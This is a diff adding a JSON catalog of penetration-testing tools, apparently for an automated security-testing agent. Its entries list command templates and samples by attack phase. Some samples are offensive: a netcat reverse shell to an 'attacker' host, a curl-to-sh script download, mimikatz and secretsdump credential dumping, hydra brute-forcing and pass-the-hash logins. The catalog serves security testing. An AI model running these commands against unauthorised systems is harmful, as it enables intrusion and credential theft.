@@ -1,0 +1,443 @@
+[
+  {
+    "name": "nmap",
+    "description": "Network exploration and security auditing tool. Discovers hosts, open ports, services, and OS detection.",
+    "cmd": "nmap -sV -sC -oN nmap_scan.txt {target}",
+    "keywords": ["port", "scan", "service", "network", "discovery", "host", "tcp", "udp"],
+    "samples": ["nmap -sV 192.168.1.1", "nmap -p- --min-rate=1000 target.com", "nmap -sU -sV 10.0.0.1"],
+    "phase": "recon",
+    "timeout": 600
+  },
+  {
+    "name": "masscan",
+    "description": "Fast TCP port scanner. Scans entire internet in minutes. Best for large network ranges.",
+    "cmd": "masscan {target} -p1-65535 --rate=1000 -oL masscan_results.txt",
+    "keywords": ["fast", "port", "scan", "mass", "range", "tcp"],
+    "samples": ["masscan 10.0.0.0/8 -p80,443", "masscan 192.168.1.0/24 --rate=10000"],
+    "phase": "recon",
+    "timeout": 300
+  },
+  {
+    "name": "subfinder",
+    "description": "Subdomain discovery tool. Finds subdomains using passive sources like DNS, certificates.",
+    "cmd": "subfinder -d {target} -o subdomains.txt",
+    "keywords": ["subdomain", "dns", "domain", "discovery", "passive", "enumeration"],
+    "samples": ["subfinder -d example.com", "subfinder -d target.com -all"],
+    "phase": "recon",
+    "timeout": 300
+  },
+  {
+    "name": "httpx",
+    "description": "Fast HTTP toolkit. Probes for web servers, extracts titles, status codes, tech stack.",
+    "cmd": "httpx -l {target} -status-code -title -tech-detect -o httpx_results.txt",
+    "keywords": ["http", "web", "probe", "status", "title", "technology"],
+    "samples": ["cat domains.txt | httpx -status-code", "httpx -u https://target.com -tech-detect"],
+    "phase": "recon",
+    "timeout": 300
+  },
+  {
+    "name": "whatweb",
+    "description": "Web fingerprinting tool. Identifies CMS, frameworks, server software, and plugins.",
+    "cmd": "whatweb -v {target}",
+    "keywords": ["fingerprint", "cms", "technology", "wordpress", "framework", "web"],
+    "samples": ["whatweb https://target.com", "whatweb -a 3 target.com"],
+    "phase": "recon",
+    "timeout": 120
+  },
+  {
+    "name": "amass",
+    "description": "In-depth attack surface mapping and asset discovery. Subdomain enum with multiple sources.",
+    "cmd": "amass enum -d {target} -o amass_results.txt",
+    "keywords": ["subdomain", "asset", "discovery", "dns", "attack surface"],
+    "samples": ["amass enum -d example.com", "amass enum -brute -d target.com"],
+    "phase": "recon",
+    "timeout": 600
+  },
+  {
+    "name": "theHarvester",
+    "description": "Gather emails, names, subdomains, IPs from public sources. OSINT tool.",
+    "cmd": "theHarvester -d {target} -b all",
+    "keywords": ["email", "osint", "harvest", "names", "linkedin", "google"],
+    "samples": ["theHarvester -d company.com -b google", "theHarvester -d target.com -b linkedin"],
+    "phase": "recon",
+    "timeout": 300
+  },
+  {
+    "name": "dnsrecon",
+    "description": "DNS enumeration tool. Zone transfers, brute force, cache snooping.",
+    "cmd": "dnsrecon -d {target}",
+    "keywords": ["dns", "zone transfer", "enumeration", "records", "mx", "ns"],
+    "samples": ["dnsrecon -d example.com -t axfr", "dnsrecon -d target.com -t brt"],
+    "phase": "recon",
+    "timeout": 180
+  },
+  {
+    "name": "shodan",
+    "description": "Search engine for internet-connected devices. Find exposed services and vulnerabilities.",
+    "cmd": "shodan search hostname:{target}",
+    "keywords": ["shodan", "iot", "exposed", "internet", "devices", "search"],
+    "samples": ["shodan host 1.2.3.4", "shodan search 'apache port:80'"],
+    "phase": "recon",
+    "timeout": 60
+  },
+  {
+    "name": "wafw00f",
+    "description": "Web Application Firewall detection tool. Identifies WAF/IPS protecting targets.",
+    "cmd": "wafw00f {target}",
+    "keywords": ["waf", "firewall", "detection", "bypass", "protection"],
+    "samples": ["wafw00f https://target.com", "wafw00f -a target.com"],
+    "phase": "recon",
+    "timeout": 60
+  },
+  {
+    "name": "gobuster",
+    "description": "Directory and file brute-forcing tool. Discovers hidden paths and files on web servers.",
+    "cmd": "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+    "keywords": ["directory", "brute", "fuzz", "path", "files", "hidden", "web"],
+    "samples": ["gobuster dir -u http://target.com -w wordlist.txt", "gobuster dns -d example.com -w subdomains.txt"],
+    "phase": "enum",
+    "timeout": 600
+  },
+  {
+    "name": "ffuf",
+    "description": "Fast web fuzzer. Directory discovery, parameter fuzzing, virtual host enumeration.",
+    "cmd": "ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf_results.json -of json",
+    "keywords": ["fuzz", "directory", "parameter", "brute", "web", "vhost"],
+    "samples": ["ffuf -u http://target.com/FUZZ -w wordlist.txt", "ffuf -u http://target.com?id=FUZZ -w numbers.txt"],
+    "phase": "enum",
+    "timeout": 600
+  },
+  {
+    "name": "nikto",
+    "description": "Web server vulnerability scanner. Checks for dangerous files, outdated software, misconfigs.",
+    "cmd": "nikto -h {target} -o nikto_results.txt",
+    "keywords": ["vulnerability", "web", "scanner", "misconfig", "cgi", "outdated"],
+    "samples": ["nikto -h http://target.com", "nikto -h target.com -p 8080"],
+    "phase": "enum",
+    "timeout": 600
+  },
+  {
+    "name": "nuclei",
+    "description": "Fast vulnerability scanner using templates. CVE detection, misconfigs, exposures.",
+    "cmd": "nuclei -u {target} -t cves/ -o nuclei_results.txt",
+    "keywords": ["cve", "vulnerability", "template", "scanner", "nuclei", "exploit"],
+    "samples": ["nuclei -u https://target.com -t cves/", "nuclei -l urls.txt -t misconfiguration/"],
+    "phase": "enum",
+    "timeout": 600
+  },
+  {
+    "name": "enum4linux",
+    "description": "Windows/Samba enumeration tool. Users, shares, groups, password policy.",
+    "cmd": "enum4linux -a {target}",
+    "keywords": ["smb", "windows", "shares", "users", "samba", "netbios", "enum"],
+    "samples": ["enum4linux -a 192.168.1.10", "enum4linux -U -S target"],
+    "phase": "enum",
+    "timeout": 300
+  },
+  {
+    "name": "smbclient",
+    "description": "SMB/CIFS client. List and access Windows shares.",
+    "cmd": "smbclient -L //{target} -N",
+    "keywords": ["smb", "shares", "windows", "cifs", "files"],
+    "samples": ["smbclient -L //192.168.1.10 -N", "smbclient //target/share -U user"],
+    "phase": "enum",
+    "timeout": 60
+  },
+  {
+    "name": "ldapsearch",
+    "description": "LDAP enumeration. Query Active Directory for users, groups, computers.",
+    "cmd": "ldapsearch -x -H ldap://{target} -b 'dc=domain,dc=com'",
+    "keywords": ["ldap", "active directory", "users", "groups", "ad", "domain"],
+    "samples": ["ldapsearch -x -H ldap://dc.target.com -b 'dc=target,dc=com'"],
+    "phase": "enum",
+    "timeout": 120
+  },
+  {
+    "name": "rpcclient",
+    "description": "RPC client for Windows. Enumerate users, groups, shares via RPC.",
+    "cmd": "rpcclient -U '' -N {target}",
+    "keywords": ["rpc", "windows", "users", "enumeration", "null session"],
+    "samples": ["rpcclient -U '' -N 192.168.1.10 -c 'enumdomusers'"],
+    "phase": "enum",
+    "timeout": 60
+  },
+  {
+    "name": "snmpwalk",
+    "description": "SNMP enumeration tool. Walk MIB tree to discover system information.",
+    "cmd": "snmpwalk -v2c -c public {target}",
+    "keywords": ["snmp", "mib", "community", "network", "enumeration"],
+    "samples": ["snmpwalk -v2c -c public 192.168.1.1", "snmpwalk -v3 target"],
+    "phase": "enum",
+    "timeout": 180
+  },
+  {
+    "name": "wpscan",
+    "description": "WordPress vulnerability scanner. Plugins, themes, users, vulnerabilities.",
+    "cmd": "wpscan --url {target} --enumerate vp,vt,u",
+    "keywords": ["wordpress", "cms", "plugin", "vulnerability", "wp"],
+    "samples": ["wpscan --url https://target.com", "wpscan --url target.com --api-token TOKEN"],
+    "phase": "enum",
+    "timeout": 300
+  },
+  {
+    "name": "sqlmap",
+    "description": "Automatic SQL injection tool. Detects and exploits SQL injection vulnerabilities.",
+    "cmd": "sqlmap -u '{target}' --batch --dbs",
+    "keywords": ["sql", "injection", "database", "sqli", "exploit", "dump"],
+    "samples": ["sqlmap -u 'http://target.com?id=1' --dbs", "sqlmap -r request.txt --dump"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "hydra",
+    "description": "Password brute-forcing tool. Supports SSH, FTP, HTTP, SMB, and many protocols.",
+    "cmd": "hydra -L users.txt -P passwords.txt {target} ssh",
+    "keywords": ["brute", "password", "login", "ssh", "ftp", "http", "crack"],
+    "samples": ["hydra -l admin -P rockyou.txt ssh://target", "hydra -L users.txt -P pass.txt target http-post-form"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "metasploit",
+    "description": "Exploitation framework. Thousands of exploits, payloads, post-exploitation modules.",
+    "cmd": "msfconsole -q -x 'search {target}; exit'",
+    "keywords": ["exploit", "payload", "shell", "meterpreter", "msf", "reverse"],
+    "samples": ["msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue'", "msfvenom -p windows/meterpreter/reverse_tcp"],
+    "phase": "exploit",
+    "timeout": 300
+  },
+  {
+    "name": "searchsploit",
+    "description": "Exploit-DB search tool. Find public exploits for known vulnerabilities.",
+    "cmd": "searchsploit {target}",
+    "keywords": ["exploit", "exploitdb", "cve", "search", "poc"],
+    "samples": ["searchsploit apache 2.4", "searchsploit -m 12345"],
+    "phase": "exploit",
+    "timeout": 30
+  },
+  {
+    "name": "crackmapexec",
+    "description": "Swiss army knife for Windows/AD. SMB, WinRM, MSSQL exploitation.",
+    "cmd": "crackmapexec smb {target} -u user -p password",
+    "keywords": ["smb", "windows", "ad", "lateral", "cme", "winrm", "pass the hash"],
+    "samples": ["cme smb 192.168.1.0/24 -u admin -p password", "cme smb target -u user -H hash"],
+    "phase": "exploit",
+    "timeout": 300
+  },
+  {
+    "name": "impacket-psexec",
+    "description": "Remote command execution on Windows via SMB. Requires valid credentials.",
+    "cmd": "impacket-psexec {target} -hashes :HASH",
+    "keywords": ["psexec", "windows", "remote", "smb", "admin", "shell"],
+    "samples": ["psexec.py domain/user:password@target", "psexec.py -hashes :hash user@target"],
+    "phase": "exploit",
+    "timeout": 120
+  },
+  {
+    "name": "evil-winrm",
+    "description": "WinRM shell. Remote PowerShell access to Windows targets.",
+    "cmd": "evil-winrm -i {target} -u user -p password",
+    "keywords": ["winrm", "powershell", "windows", "shell", "remote"],
+    "samples": ["evil-winrm -i 192.168.1.10 -u admin -p pass", "evil-winrm -i target -u user -H hash"],
+    "phase": "exploit",
+    "timeout": 120
+  },
+  {
+    "name": "john",
+    "description": "Password cracker. Cracks hashes from various formats.",
+    "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt {target}",
+    "keywords": ["crack", "hash", "password", "brute", "john"],
+    "samples": ["john --format=raw-md5 hashes.txt", "john --wordlist=rockyou.txt shadow"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "hashcat",
+    "description": "Advanced GPU-based password cracker. Fastest hash cracking tool.",
+    "cmd": "hashcat -m 0 {target} /usr/share/wordlists/rockyou.txt",
+    "keywords": ["crack", "hash", "gpu", "password", "brute"],
+    "samples": ["hashcat -m 1000 hashes.txt rockyou.txt", "hashcat -m 500 -a 3 hashes.txt ?a?a?a?a"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "responder",
+    "description": "LLMNR/NBT-NS/MDNS poisoner. Capture NTLMv2 hashes on the network.",
+    "cmd": "responder -I eth0 -wrf",
+    "keywords": ["llmnr", "nbns", "poison", "ntlm", "hash", "mitm"],
+    "samples": ["responder -I eth0", "responder -I eth0 -wrf"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "commix",
+    "description": "Command injection exploitation tool. Detects and exploits command injection.",
+    "cmd": "commix -u '{target}'",
+    "keywords": ["command", "injection", "rce", "os", "shell"],
+    "samples": ["commix -u 'http://target.com?cmd=id'", "commix --url=target --data='input=test'"],
+    "phase": "exploit",
+    "timeout": 300
+  },
+  {
+    "name": "xsstrike",
+    "description": "Advanced XSS detection and exploitation tool.",
+    "cmd": "xsstrike -u '{target}'",
+    "keywords": ["xss", "cross-site", "scripting", "web", "injection"],
+    "samples": ["xsstrike -u 'http://target.com?q=test'", "xsstrike --crawl -u target.com"],
+    "phase": "exploit",
+    "timeout": 300
+  },
+  {
+    "name": "burpsuite",
+    "description": "Web application security testing platform. Proxy, scanner, intruder.",
+    "cmd": "burpsuite",
+    "keywords": ["web", "proxy", "scanner", "intercept", "burp"],
+    "samples": ["Launch Burp Suite and configure browser proxy"],
+    "phase": "exploit",
+    "timeout": 0
+  },
+  {
+    "name": "netcat",
+    "description": "Network utility for connections. Reverse shells, port scanning, file transfer.",
+    "cmd": "nc -lvnp 4444",
+    "keywords": ["netcat", "nc", "reverse", "shell", "listen", "connect"],
+    "samples": ["nc -lvnp 4444", "nc target 80", "nc -e /bin/bash attacker 4444"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "chisel",
+    "description": "TCP/UDP tunnel over HTTP. Bypass firewalls, pivot through networks.",
+    "cmd": "chisel server -p 8080 --reverse",
+    "keywords": ["tunnel", "pivot", "proxy", "firewall", "bypass"],
+    "samples": ["chisel server -p 8080 --reverse", "chisel client server:8080 R:socks"],
+    "phase": "exploit",
+    "timeout": 600
+  },
+  {
+    "name": "linpeas",
+    "description": "Linux privilege escalation checker. Finds misconfigs, SUID, creds, paths to root.",
+    "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "keywords": ["privesc", "linux", "suid", "root", "escalation", "enumeration"],
+    "samples": ["./linpeas.sh", "curl linpeas.sh | sh"],
+    "phase": "post",
+    "timeout": 300
+  },
+  {
+    "name": "winpeas",
+    "description": "Windows privilege escalation checker. Services, tokens, creds, paths to SYSTEM.",
+    "cmd": "winpeas.exe",
+    "keywords": ["privesc", "windows", "system", "escalation", "enumeration"],
+    "samples": ["winpeas.exe", "winpeas.exe quiet"],
+    "phase": "post",
+    "timeout": 300
+  },
+  {
+    "name": "pspy",
+    "description": "Linux process monitor without root. Detect cron jobs, scheduled tasks.",
+    "cmd": "./pspy64",
+    "keywords": ["process", "cron", "monitor", "linux", "privesc"],
+    "samples": ["./pspy64", "./pspy32 -pf -i 1000"],
+    "phase": "post",
+    "timeout": 300
+  },
+  {
+    "name": "mimikatz",
+    "description": "Windows credential extraction. Dump passwords, hashes, Kerberos tickets.",
+    "cmd": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
+    "keywords": ["credential", "dump", "password", "hash", "kerberos", "windows"],
+    "samples": ["mimikatz 'sekurlsa::logonpasswords'", "mimikatz 'lsadump::sam'"],
+    "phase": "post",
+    "timeout": 60
+  },
+  {
+    "name": "bloodhound",
+    "description": "Active Directory attack path finder. Visualize paths to Domain Admin.",
+    "cmd": "bloodhound-python -u user -p password -d domain.com -c all",
+    "keywords": ["active directory", "ad", "bloodhound", "domain", "attack path"],
+    "samples": ["bloodhound-python -c all -d domain.com", "SharpHound.exe -c all"],
+    "phase": "post",
+    "timeout": 300
+  },
+  {
+    "name": "rubeus",
+    "description": "Kerberos attack toolkit. Kerberoasting, AS-REP roasting, ticket manipulation.",
+    "cmd": "Rubeus.exe kerberoast",
+    "keywords": ["kerberos", "kerberoast", "ticket", "ad", "tgt", "tgs"],
+    "samples": ["Rubeus.exe kerberoast", "Rubeus.exe asreproast"],
+    "phase": "post",
+    "timeout": 120
+  },
+  {
+    "name": "secretsdump",
+    "description": "Impacket tool to dump SAM, LSA secrets, cached creds from Windows.",
+    "cmd": "impacket-secretsdump {target}",
+    "keywords": ["dump", "sam", "secrets", "hash", "ntds", "dcsync"],
+    "samples": ["secretsdump.py domain/user:pass@dc", "secretsdump.py -hashes :hash user@target"],
+    "phase": "post",
+    "timeout": 120
+  },
+  {
+    "name": "lazagne",
+    "description": "Credential recovery tool. Extracts passwords from browsers, mail, wifi, etc.",
+    "cmd": "lazagne.exe all",
+    "keywords": ["credential", "browser", "password", "wifi", "recovery"],
+    "samples": ["lazagne.exe all", "python laZagne.py all"],
+    "phase": "post",
+    "timeout": 120
+  },
+  {
+    "name": "sshuttle",
+    "description": "Transparent proxy/VPN over SSH. Pivot through compromised hosts.",
+    "cmd": "sshuttle -r user@{target} 10.0.0.0/8",
+    "keywords": ["vpn", "pivot", "ssh", "tunnel", "proxy"],
+    "samples": ["sshuttle -r user@pivot 10.0.0.0/8", "sshuttle -r root@target 0/0"],
+    "phase": "post",
+    "timeout": 600
+  },
+  {
+    "name": "proxychains",
+    "description": "Force connections through proxy. Chain tools through SOCKS/HTTP proxies.",
+    "cmd": "proxychains nmap -sT {target}",
+    "keywords": ["proxy", "socks", "chain", "pivot", "tunnel"],
+    "samples": ["proxychains nmap -sT 10.0.0.1", "proxychains curl target"],
+    "phase": "post",
+    "timeout": 300
+  },
+  {
+    "name": "ligolo-ng",
+    "description": "Advanced tunneling tool. Create tunnels for pivoting without needing SOCKS.",
+    "cmd": "ligolo-ng -selfcert",
+    "keywords": ["tunnel", "pivot", "ligolo", "network"],
+    "samples": ["./proxy -selfcert", "./agent -connect attacker:11601"],
+    "phase": "post",
+    "timeout": 600
+  },
+  {
+    "name": "trivy",
+    "description": "Vulnerability scanner for containers, filesystems, git repos. CVE detection.",
+    "cmd": "trivy image {target}",
+    "keywords": ["container", "docker", "vulnerability", "cve", "sbom", "scan"],
+    "samples": ["trivy image nginx:latest", "trivy fs ./app", "trivy repo github.com/user/repo"],
+    "phase": "recon",
+    "timeout": 300
+  },
+  {
+    "name": "trufflehog",
+    "description": "Secret scanner. Finds credentials, API keys in git repos and filesystems.",
+    "cmd": "trufflehog git {target}",
+    "keywords": ["secret", "credential", "api key", "git", "leak"],
+    "samples": ["trufflehog git https://github.com/user/repo", "trufflehog filesystem /path"],
+    "phase": "recon",
+    "timeout": 300
+  },
+  {
+    "name": "gitleaks",
+    "description": "Git secret scanner. Detect hardcoded secrets in git history.",
+    "cmd": "gitleaks detect --source {target}",
+    "keywords": ["secret", "git", "credential", "leak", "history"],
+    "samples": ["gitleaks detect --source .", "gitleaks detect --source /repo --report-path report.json"],
+    "phase": "recon",
+    "timeout": 300
+  }
+]
